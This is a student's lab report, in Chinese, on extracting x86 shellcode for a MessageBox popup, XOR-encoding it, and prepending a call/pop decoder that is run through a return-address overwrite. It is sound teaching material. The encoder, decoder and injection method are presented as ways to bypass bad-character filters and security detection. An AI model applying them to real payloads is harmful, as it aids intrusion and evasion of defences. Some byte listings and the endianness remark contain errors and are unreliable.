# 《软件安全》实验报告

姓名：许洋   学号：2313721  班级：1070

## **实验名称：**

Shellcode编写及编码

##  **实验要求：**

复现第五章实验三，并将产生的编码后的shellcode在示例5-4中进行验证，阐述shellcode编码的原理、shellcode提取的思想。

## **实验过程：**

### 一、shellcode代码的提取

首先，我们先输入5-2中的代码，设置断点，进行反汇编，获得汇编代码。

```c++
#include <stdio.h> 
#include <windows.h> 
void main() 
{ 
    MessageBox(NULL,NULL,NULL,0); 
    return; 
}
```

  我们想要找出MessageBox在我们的系统中的位置，利用在5.1中的代码：

```c++
#include <windows.h> 
#include <stdio.h> 
int main() 
{  
        HINSTANCE LibHandle; 
        FARPROC ProcAdd; 
        LibHandle = LoadLibrary("user32"); 
        //获取user32.dll的地址 
        printf("user32 = 0x%x \n", LibHandle); 
        //获取MessageBoxA的地址 
        ProcAdd=(FARPROC)GetProcAddress(LibHandle,"MessageBoxA"); 
        printf("MessageBoxA = 0x%x \n", ProcAdd); 
        getchar(); 
        return 0; 
}
```

 得出结果：MessageBox所在的地址是0x77d507ea

 然后我们对汇编代码进行适当的修改，重新编写C语言程序，我们使用_asm语句，来实现在C语言中插入汇编语言代码。

```c++
#include <stdio.h> 
#include <windows.h> 
void main() 
{ 
    _asm 
    { 
        xor ebx,ebx 
        push ebx//push 0 
        push ebx 
        push ebx 
        push ebx 
        mov eax, 77d507eah// 77d507eah 这个是 MessageBox 函数在系统中的地址 
        call eax 
    }
    return; 
} 
```

  在这里，我们将push 0修改为了push ebx，因为在指令中不能出现0字节，因此我们在指令中将ebx与自身异或，做到清零操作，然后通过四个push操作来压入四个0寄存器。修改完代码后，我们运行代码，成功出现了弹窗，证明了我们的代码是正确的。![20250403-221710](D:\许洋计算机科学与技术\软件安全\作业\实验5\实验5\20250403-221710.jpg)

接下来，我们跳转到反汇编代码，查看对应的地址：![20250403-221912](D:\许洋计算机科学与技术\软件安全\作业\实验5\实验5\20250403-221912.jpg)

我们发现，我们编写的_asm代码部分的指令地址开始于00401028，结束于00401033，我们跳转到该部分内存空间的机器指令，读出对应的机器码：

33 DB 53 53 53 53 B8 EA 07 D5 77 FF D0

到这一步，我们就完成了对于shellcode代码的提取。下面我们需要对我们的代码进行运行与验证，检验我们的代码提取是否正确，我们输入以下的代码，运行，观察是否出现弹窗。

```c++
#include <stdio.h> 
#include <windows.h> 
char ourshellcode[]="\x33\xDB\x53\x53\x53\x53\xB8\xEA\x07\xD5\x77\xFF\xD0"; 
void main() 
{ 
     LoadLibrary("user32.dll"); 
     int *ret; 
     ret=(int*)&ret+2; 
     (*ret)=(int)ourshellcode; 
     return; 
} 
```

  运行代码，得到了弹窗，证明我们的shellcode代码是正确的。![20250403-222419](D:\许洋计算机科学与技术\软件安全\作业\实验5\实验5\20250403-222419.jpg)

###  二、shellcode代码的编写

 我们接下来，实现自己编写shellcode代码，比如说，我们想要自己编写一个代码，要求实现调用Messagebox输出“Hello world”。我们可以分为以下的步骤。

##### 1.编写C语言代码

我们首先写出“Hello world”的ASCII码：\x68\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x20

根据大端序的内存存储方式，我们需要将存储的顺序倒过来，然后通过mov eax,esp指令来使用eax保存字符串的首地址，便于作为Messagebox函数的参数进行入栈，我们编写以下的代码来实现：

```c++
#include <stdio.h> 
#include <windows.h> 
void main() 
{ 
     LoadLibrary("user32.dll");//加载user32.dll  
    _asm 
    { 
        xor ebx,ebx 
        push ebx//push 0 
        push 20646C72h 
        push 6F77206Fh 
        push 6C6C6568h 
        mov eax, esp 
        push ebx//push 0 
        push eax 
        push eax 
        push ebx 
        mov eax, 77d507eah// 77d507eah 这个是 MessageBox 函数在系统中的地址 
        call eax 
    } 
    return; 
} 
```

 我们运行代码，发现得到正确的弹窗：![20250404-085259](D:\许洋计算机科学与技术\软件安全\作业\实验5\实验5\20250404-085259.jpg)

#####  2.跳转到反汇编界面以获取对应机器码

 运行成功后，我们获得相应的机器码![20250404-085540](D:\许洋计算机科学与技术\软件安全\作业\实验5\实验5\20250404-085540.jpg)

发现是，地址从00401028到了0040103C，将这部分的机器码提取出来，shellcode代码是：

\x33\xDB\x53\x68\x72\x6C\x64\x20\x68\x6F\x20\x77\x6F\x68\x68\x65\x6C\x6C\x8B\xC4\x53\x50\x50\x53\xB8\xEA\x07\xD5\x77\xBB\xD0

所以，我们成功的编写了一段shellcode代码。

### 三、shellcode代码的编码

在我们编写并提取出shellcode代码后，我们需要对shellcode进行编码，才能进行攻击。我们使用较为简单的异或编码进行攻击。我们输入以下的代码，进行编码。

```c++
#include <stdlib.h> 
#include <string.h> 
#include <stdio.h> 
void encoder(char* input, unsigned char key) 
{ 
    int i = 0, len = 0;     
    FILE * fp; 
    len = strlen(input); 
    unsigned char * output = (unsigned char *)malloc(len + 1);      
    for (i = 0; i<len; i++) 
    	output[i] = input[i] ^ key;   
    fp = fopen("encode.txt", "w+");      
    fprintf(fp, "\""); 
    for (i = 0; i<len; i++) 
    { 
        fprintf(fp, "\\x%0.2x", output[i]); 
        if ((i + 1) % 16 == 0) 
        	fprintf(fp, "\"\n\""); 
    } 
    fprintf(fp, "\""); 
    fclose(fp); 
    printf("dump the encoded shellcode to encode.txt OK!\n"); 
    free(output); 
} 
int main() 
{ 
    char sc[] =  "\x33\xDB\x53\x68\x72\x6C\x64\x20\x68\x6F\x20\x77\x6F\x68\x68\x65\x6C\x6C\x8B\xC4\x53\x50\x50\x53\xB8\xEA\x07\xD5\x77\xFF\xD0\x90"; 
    encoder(sc, 0x44); 
    getchar(); 
    return 0; 
} 

```

  key是我们的异或的字符，是固定的取值0x44，main函数中，我们通过for循环，将每一位shellcode都进行异或操作，将新得到的shellcode进行保存即可，输出如下：![20250403-224448](D:\许洋计算机科学与技术\软件安全\作业\实验5\实验5\20250403-224448.jpg)

  我们去寻找生成的encode文件，打开之后，发现里面存储着我们的编码。\x77\x9f\x17\x2c\x36\x28\x20\x64\x2c\x2b\x64\x33\x2b\x2c\x2c\x21\x28\x28\xcf\x80\x17\x14\x14\x17\xfc\xae\x43\x91\x33\xbb\x94\xd4 表示我们完成了编码操作。![20250403-225457](D:\许洋计算机科学与技术\软件安全\作业\实验5\实验5\20250403-225457.jpg)

###  四、shellcode代码的解码

 在我们进行编码之后，我们还需要进行解码，才能完成最后的shellcode注入攻击。我们需要在shellcode前加上一段代码来进行解码，这样才能确保程序正确运行。

 我们用以下的代码来进行解码：![20250404-001719](D:\许洋计算机科学与技术\软件安全\作业\实验5\实验5\20250404-001719.jpg)

 程序中，默认EAX 在shellcode开始时对准shellcode起始位置，之后的代码将每次将shellcode的代码异或特定key（为0x44）后重新覆盖原先shellcode的代码。末尾，放一个空指令0x90作为结束符。 

但是我们需要确定shellcode的当前地址，所以我们看如下代码

```c++
#include <iostream> 
using namespace std; 
int main(int argc, char const *argv[]) 
{ 
    unsigned   int   temp;     
    __asm{ 
        call lable; 
        lable: 
        pop eax; 
        mov temp,eax; 
    } 
    cout <<temp <<endl; 
    return 0; 
} 
```

进行反汇编后我们发现：其核心语句在于“call lable; lable: pop eax;”之后，eax的值就是当前指令地址了。 原因是call lable的时候，会将当前EIP的值（也就是下一条指令pop eax的指令地址）入栈。![20250404-001924](D:\许洋计算机科学与技术\软件安全\作业\实验5\实验5\20250404-001924.jpg)

所以我们采用以下代码

```c++
#include <stdlib.h> 
#include <string.h> 
#include <stdio.h> 
int main() 
{ 
    __asm 
    { 
        call lable;  
        lable: pop eax;  
        add eax, 0x15           ;越过decoder记录shellcode 起始地址      
        xor ecx, ecx 
        decode_loop: 
        mov bl, [eax + ecx] 
        xor bl, 0x44                 ;用 0x44 作为 key 
        mov [eax + ecx], bl 
        inc ecx 
        cmp bl, 0x90   
        jne decode_loop  
    }
    return 0; 
} 
```

在这段代码中，我们巧妙地利用：

```c++
call label；
 label：pop eax； 
```

 当我们执行call label时，eip的值（指向pop eax这条指令）被压入栈中，然后我们紧接着进行pop操作，这时我们就把eax的值赋值成了当前指令的值了，然后再加上0x15（解码代码的指令长度数），就定位到了我们的shellcode代码的起始位置，解决了这个关键问题。

  在decode_loop的循环之中，我们不断地将编码后的代码再异或0x44来实现解码操作。解码的终止条件是用cmp语句来判断bl是否等于我们在原shellcode代码最后增加的“0x90”，如果是的话就跳出循环。通过这一代码，我们就实现了解码的操作。我们提取出shellcode代码，然后成功进行指令的解码，解码的代码为：

\xE8\x00\x00\x00\x00\x58\x83\xc0\x15\x33\xc9\x8a\x1c\x08\x80\xf3\x44\x88\x1c\x08\x41\x80\xfb\x90\x75\xf1

  我们将解码和弹窗输出的shellcode的编码合在一起，就可以得到完整的shellcode：

\xE8\x00\x00\x00\x00\x58\x83\xc0\x15\x33\xc9\x8a\x1c\x08\x80\xf3\x44\x88\x1c\x08\x41\x80\xfb\x90\x75\xf1\x77\x9f\x17\x2c\x36\x28\x20\x64\x2c\x2b\x64\x33\x2b\x2c\x2c\x21\x28\x28\xcf\x80\x17\x14\x14\x17\xfc\xae\x43\x91\x33\xbb\x94\xd4

  我们将下面这段代码代入到程序中进行验证，观察到弹窗输出“Hello world”，说明我们的整个操作正确。 

```c++
#include <stdio.h>
#include <windows.h>
char ourshellcode[]="\xE8\x00\x00\x00\x00\x58\x83\xc0\x15\x33\xc9\x8a\x1c\x08\x80\xf3\x44\x88\x1c\x08\x41\x80\xfb\x90\x75\xf1\x77\x9f\x17\x2c\x36\x28\x20\x64\x2c\x2b\x64\x33\x2b\x2c\x2c\x21\x28\x28\xcf\x80\x17\x14\x14\x17\xfc\xae\x43\x91\x33\xbb\x94\xd4";
void main()
{
  LoadLibrary("user32.dll");
  int *ret;
  ret=(int*)&ret+2;
  (*ret)=(int)ourshellcode;
  return;
}
```

  运行程序，发现程序输出“Hello world”，说明程序正确！![20250404-085655](D:\许洋计算机科学与技术\软件安全\作业\实验5\实验5\20250404-085655.jpg)

## **心得体会：**

**Shellcode的本质与重要性**

Shellcode是直接嵌入到目标程序中的一段机器指令代码，它通常用于漏洞利用或系统调用。在实验中，我通过反汇编和内存操作，提取出了MessageBox函数对应的机器码，并将其转换为Shellcode。这让我意识到，Shellcode的核心在于其能够独立运行，并且通常需要避免出现如0x00这样的特殊字节，以确保其在注入时不会被截断。

此外，Shellcode的设计还需要考虑平台的兼容性。例如，在实验中我们使用了user32.dll中的MessageBoxA函数地址，但这个地址可能会因操作系统版本或服务包的不同而变化。因此，在实际应用中，动态获取API地址是一个非常重要的步骤。

**Shellcode提取的思想**

Shellcode提取的核心思想是将高级语言或汇编代码转换为底层的机器指令，确保其能够独立运行并满足特定环境的需求。其基本步骤包括：首先编写实现目标功能的代码（如用C语言调用MessageBoxA显示弹窗）；然后通过调试工具对程序进行反汇编，分析每条指令对应的机器码，并检查是否符合Shellcode的要求（如避免特殊字符0x00）；接着对提取出的机器码进行优化和调整，例如用xor ebx, ebx代替push 0以消除零字节；最后将提取出的Shellcode嵌入到测试程序中运行，验证其能否正确执行预期功能。整个过程需要关注平台相关性、栈平衡及寄存器恢复等细节，以确保Shellcode的兼容性和稳定性。

**编码与解码的意义**

我学习了如何对Shellcode进行编码和解码。Shellcode 代码编制过程通常需要进行编码，因为：（1）字符集的差异。应用程序应用 平台的不同，可能的字符集会有差异，限制exploit的稳定性。（2）绕过坏字符。针对某个 应用，可能对某些“坏字符”变形或者截断而破坏exploit，比如strcpy函数对NULL字符 的不可接纳性，再比如很多应用在某些处理流程中可能会限制 0x0D（\r）、 0x0A（\n）或者 0x20（空格）字符。（3）绕过安全防护检测。实验中采用的是简单的异或编码方法，这种方式虽然简单，但在实际攻击中却非常有效。

同时，我也理解了解码器的重要性。解码器的作用是在Shellcode执行前将其还原为原始状态，从而确保程序能够正确运行。在解码器的设计中，我学会了如何通过call和pop指令动态获取当前指令的地址，以及如何通过循环逐字节地解码数据。这种技巧在漏洞利用中非常常见，尤其是在栈溢出攻击中。
